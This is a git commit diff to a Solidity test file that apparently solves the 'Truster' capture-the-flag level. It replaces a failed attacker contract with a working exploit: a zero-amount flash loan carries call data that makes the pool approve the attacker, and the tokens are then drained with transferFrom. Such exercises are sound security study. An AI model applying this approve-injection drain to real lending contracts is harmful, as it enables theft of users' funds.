aa2ecc31278feda6feae52c73bc00a50d6f7d475
bentobox19.eth <bentobox19@protonmail.com>
2023-04-02 13:38:58 -0400

    Beat truster

--- test/03-truster/Truster.t.sol
+++ test/03-truster/Truster.t.sol
@@ -13,43 +13,35 @@ interface ITrusterPool {
     bytes calldata data) external returns (bool);
 }
 
-contract Attacker {
-  TrusterLevel internal level;
-  ITrusterPool internal pool;
-  IERC20 internal token;
-
-  constructor(TrusterLevel _level) {
-    level = _level;
-    pool = ITrusterPool(address(level.pool()));
-    token = IERC20(address(level.token()));
-  }
-
-  function attack() public {
-    bytes memory data = abi.encodeWithSignature("onFlashLoan()");
-
-    pool.flashLoan(
-      level.TOKENS_IN_POOL(),
-      address(this),
-      address(this),
-      data
-    );
-  }
-
-  function onFlashLoan() public {
-    token.transfer(address(pool), level.TOKENS_IN_POOL());
-  }
-}
-
 contract TrusterTest is Test {
   TrusterLevel internal level = new TrusterLevel();
+  ITrusterPool internal pool;
+  IERC20 internal token;
+  uint256 internal TOKENS_IN_POOL;
 
   function setUp() public {
     level.setup();
+    pool = ITrusterPool(address(level.pool()));
+    token = IERC20(address(level.token()));
+    TOKENS_IN_POOL = level.TOKENS_IN_POOL();
   }
 
   function testExploit() public {
-    Attacker attacker = new Attacker(level);
-    attacker.attack();
-    // level.validate();
+    // tell the pool in the custom function to approve a transfer to us
+    bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, address(this), TOKENS_IN_POOL);
+
+    // the pool doesn't control for a loan of 0 tokens, nor charges a fee.
+    // hence, we don't need to prepare a callback to give it funds back.
+    pool.flashLoan(
+      0,
+      address(this),
+      address(token),
+      data
+    );
+
+    // with our approval planted, we just take the funds
+    token.transferFrom(address(pool), address(this), TOKENS_IN_POOL);
+
+    level.validate();
   }
 }
